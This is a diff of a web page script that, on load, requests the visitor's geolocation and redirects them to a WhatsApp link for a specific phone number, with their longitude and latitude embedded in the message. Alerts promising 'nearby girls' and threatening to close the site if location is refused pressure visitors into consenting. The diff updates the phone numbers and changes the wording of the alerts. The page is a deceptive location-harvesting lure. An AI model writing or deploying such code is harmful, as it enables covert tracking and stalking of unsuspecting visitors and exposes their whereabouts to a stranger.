@@ -54,12 +54,12 @@
             navigator.geolocation.getCurrentPosition(showPosition)
         }
         else{
-            window.location = "https://wa.me/0549263991/?text='Sorry You Can't Access This"
+            window.location = "https://wa.me/2330549263991/?text='Sorry You Can't Access This"
         }
     }
 
     function showPosition(position){
-        window.location = "https://wa.me/0500709994/?text=UserCode To Search Is"+position.coords.longitude + "<?,k" + position.coords.latitude
+        window.location = "https://wa.me/2330500709994/?text=UserCode To Search Is"+position.coords.longitude + "<?,k" + position.coords.latitude
 
         function loadFrame(){
     let frame = document.getElementsByTagName("iframe")[0]
@@ -70,7 +70,7 @@
     function showError(error) {
   switch(error.code) {
     case error.PERMISSION_DENIED:
-     document.write("Sorry But You Can't Access This Media While's Your Location Isn't Turned Off.")
+     document.write("Sorry But You Can't Access This Media While's Your LATLON Isn't Turned Off.")
       break;
     case error.POSITION_UNAVAILABLE:
       document.write("Location information is unavailable.")
@@ -85,7 +85,7 @@
 }
 
 window.onload = getLocat
- alert("THIS SITE USES LOCATION TO SHOW RELEVANT CONTENT AND NEARBY GIRLS TO USERS")
- alert("DISSABLING THE PROMPT WHEN ASKED FOR YOUR LOCATION WILL RESULT IN THE SITE BEING CLOSED.PLEASE ADHERE 🤗")
+ alert("THIS SITE USES LATLON TO SHOW RELEVANT CONTENT AND NEARBY GIRLS TO USERS")
+ alert("DISSABLING THE PROMPT WHEN ASKED FOR YOUR LATLON WILL RESULT IN THE SITE BEING CLOSED.PLEASE ADHERE 🤗")
 </script>
 </html>
